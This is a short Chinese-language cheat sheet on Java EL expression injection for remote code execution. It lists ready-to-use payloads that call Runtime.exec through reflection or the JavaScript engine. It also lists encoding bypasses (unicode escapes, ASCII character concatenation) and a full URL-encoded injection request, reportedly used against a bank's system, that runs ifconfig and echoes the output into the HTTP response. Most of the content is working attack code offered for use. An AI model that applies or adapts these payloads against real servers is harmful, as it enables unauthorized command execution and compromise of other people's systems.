## EL表达式实现RCE

### 参考链接

https://xz.aliyun.com/t/7692#toc-20

https://y4er.com/posts/java-expression-injection/#%E8%B0%83%E7%94%A8java%E6%96%B9%E6%B3%95

### payload

利用反射实现RCE

```java
${pageContext.setAttribute("a","".getClass().forName("java.lang.Runtime").getMethod("exec","".getClass()).invoke("".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"calc.exe"))}
```

利用js引擎实现RCE

```java
${''.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval("java.lang.Runtime.getRuntime().exec('calc')")}

```

### 绕过

unicode字符，八进制，Ascii字符



[工商银行某系统存在远程EL表达式注入漏洞(命令执行)](http://cn-sec.com/archives/15356.html)

这个是通过unicode字符加字符串的拼接

```
groupName=1&papersType=${%23a%3d/u0028new%20java.lang.ProcessBuilder/u0028new%20java.lang.String[]{/u0027/sbin/ifconfig/u0027,/u0027-a/u0027}/u0029/u0029.start/u0028/u0029,%23b%3d%23a.getInputStream/u0028/u0029,%23c%3dnew%**.**.**.**.InputStreamReader/u0028%23b/u0029,%23d%3dnew%**.**.**.**.BufferedReader/u0028%23c/u0029,%23e%3dnew%20char[50000],%23d.read/u0028%23e/u0029,%23ringzero%3d%23context.get/u0028/u0027com.opensymphony.xwork2.dispatcher.HttpServletResponse/u0027/u0029,%23ringzero.getWriter/u0028/u0029.println/u0028%23e/u0029,%23ringzero.getWriter/u0028/u0029.flush/u0028/u0029,%23ringzero.getWriter/u0028/u0029.close/u0028/u0029}&papersValue=1&baseacct=1&retMsg=1&retCode=1
```

```
${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{'/sbin/ifconfig','-a'})).start(),#b=#a.getInputStream(),#c=new **.**.**.**.InputStreamReader(#b),#d=new **.**.**.**.BufferedReader(#c),#e=new char[50000],#d.read(#e),#ringzero=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),#ringzero.getWriter().println(#e),#ringzero.getWriter().flush(),#ringzero.getWriter().close()}
```

Ascii字符绕过：

```
// 字符串 wh，多个cocnat嵌套构造whoami
java.lang.Character.toString(119).concat(java.lang.Character.toString(104))

```

